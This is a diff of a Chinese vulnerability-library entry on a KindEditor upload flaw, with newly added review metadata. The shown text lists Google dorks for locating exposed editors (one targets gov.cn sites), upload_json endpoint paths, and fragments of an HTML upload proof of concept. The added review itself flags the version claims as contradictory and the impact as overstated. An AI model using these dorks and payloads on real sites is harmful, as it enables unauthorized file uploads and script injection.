@@ -1,6 +1,40 @@
 ---
 source: "白阁文库 BaizeSec/bylibrary"
+product: "KindEditor/上传端点暴露与HTML托管"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_role: "unknown"
+identifier_status: "unknown"
+title: "kindeditor 4.1.5上传漏洞"
+prerequisites: "来源所述条件，未列明部分仍待核：标题/简介<=4.1.5，但实验明确4.1.10，范围矛盾；依赖服务端example handler暴露、鉴权与允许扩展名"
+side_effects: "未执行；本文需注意的操作影响：上传允许类型与安全边界未分清；扩展表本就允许HTML/TXT，需说明应有鉴权、存储隔离/访问权限及同源脚本影响，不能等同任意WebShell上传；修复建议过于粗放；删除upload_json和file_manager可能破坏合法功能，最新版无固定点；两套路径版本及跨域页面行为未说明"
+source_status: "unknown"
+id: "vw-995b8d5e3a5a180ecf9b203e"
+entity_id: "ve-995b8d5e3a5a180ecf9b203e"
+schema_version: "1"
 ---
+
+## 核对与使用边界
+
+本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。
+
+适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：标题/简介&lt;=4.1.5，但实验明确4.1.10，范围矛盾；依赖服务端example handler暴露、鉴权与允许扩展名
+
+代码与实验材料：客户端uploadbutton和后端四语言路径，证明TXT/HTML上传，不证明服务器脚本执行；XSS还需访问同源HTML/内容类型
+
+来源证据范围：BaizeSec转载，无官方公告/原作者，复制按钮javascript:void链接残留
+
+- **适用与权限边界（1）**：版本边界与实测自相矛盾；依据：&lt;=4.1.5与4.1.10成功案例同时出现。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。
+
+- **适用与权限边界（2）**：上传允许类型与安全边界未分清；依据：扩展表本就允许HTML/TXT，需说明应有鉴权、存储隔离/访问权限及同源脚本影响，不能等同任意WebShell上传。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。
+
+- **操作与副作用边界（3）**：修复建议过于粗放；依据：删除upload_json和file_manager可能破坏合法功能，最新版无固定点；两套路径版本及跨域页面行为未说明。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。
+
+历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。
 
 # kindeditor<=4.1.5上传漏洞     	
 
@@ -16,7 +50,11 @@ source: "白阁文库 BaizeSec/bylibrary"
 
 在google中批量搜索：
 
+
+```text
 [![复制代码](./.resource/kindeditor4.1.5上传漏洞/media/img-48304ba5.gif)](javascript:void(0);)
+```
+
 
 ```
 inurl:/examples/uploadbutton.html
@@ -32,7 +70,11 @@ inurl://asp/upload_json.asp
 inurl:gov.cn/kindeditor/
 ```
 
+
+```text
 [![复制代码](./.resource/kindeditor4.1.5上传漏洞/media/img-48304ba5.gif)](javascript:void(0);)
+```
+
 
  
 
@@ -42,7 +84,11 @@ inurl:gov.cn/kindeditor/
 
 根本脚本语言自定义不同的上传地址，上传之前有必要验证文件 upload_json.* 的存在
 
+
+```text
 [![复制代码](./.resource/kindeditor4.1.5上传漏洞/media/img-48304ba5.gif)](javascript:void(0);)
+```
+
 
 ```
 /asp/upload_json.asp
@@ -54,11 +100,19 @@ inurl:gov.cn/kindeditor/
 /php/upload_json.php
 ```
 
+
+```text
 [![复制代码](./.resource/kindeditor4.1.5上传漏洞/media/img-48304ba5.gif)](javascript:void(0);)
+```
+
 
 可目录变量查看是否存在那种脚本上传漏洞:
 
+
+```text
 [![复制代码](./.resource/kindeditor4.1.5上传漏洞/media/img-48304ba5.gif)](javascript:void(0);)
+```
+
 
 ```
 kindeditor/asp/upload_json.asp?dir=file
@@ -70,7 +124,11 @@ kindeditor/jsp/upload_json.jsp?dir=file
 kindeditor/php/upload_json.php?dir=file
 ```
 
+
+```text
 [![复制代码](./.resource/kindeditor4.1.5上传漏洞/media/img-48304ba5.gif)](javascript:void(0);)
+```
+
 
 ## 0x03 漏洞利用
 
@@ -86,7 +144,11 @@ http://www.xxx.org/kindeditor//kindeditor.js
 
 2.版本是4.1.10可以进行尝试如下路径是否存在有必要验证文件 upload_json.* 
 
+
+```text
 [![复制代码](./.resource/kindeditor4.1.5上传漏洞/media/img-48304ba5.gif)](javascript:void(0);)
+```
+
 
 ```
 kindeditor/asp/upload_json.asp?dir=file
@@ -98,7 +160,11 @@ kindeditor/jsp/upload_json.jsp?dir=file
 kindeditor/php/upload_json.php?dir=file
 ```
 
+
+```text
 [![复制代码](./.resource/kindeditor4.1.5上传漏洞/media/img-48304ba5.gif)](javascript:void(0);)
+```
+
 
 3.如下图可以看出是存在jsp上传点:
 
@@ -110,9 +176,13 @@ http://www.xxx.org/kindeditor/jsp/upload_json.jsp?dir=file
 
  
 
-4.写出下面的构造上传poc,这里需要修改<script>...<script>以及url : 的内容,根据实际情况修改.
+4.写出下面的构造上传poc,这里需要修改`<script>...<script>`以及url : 的内容,根据实际情况修改.
 
+
+```text
 [![复制代码](./.resource/kindeditor4.1.5上传漏洞/media/img-48304ba5.gif)](javascript:void(0);)
+```
+
 
 ```
 <html><head>
@@ -218,7 +288,11 @@ uploadbutton.submit();
 </html>
 ```
 
+
+```text
 [![复制代码](./.resource/kindeditor4.1.5上传漏洞/media/img-48304ba5.gif)](javascript:void(0);)
+```
+
 
  
 
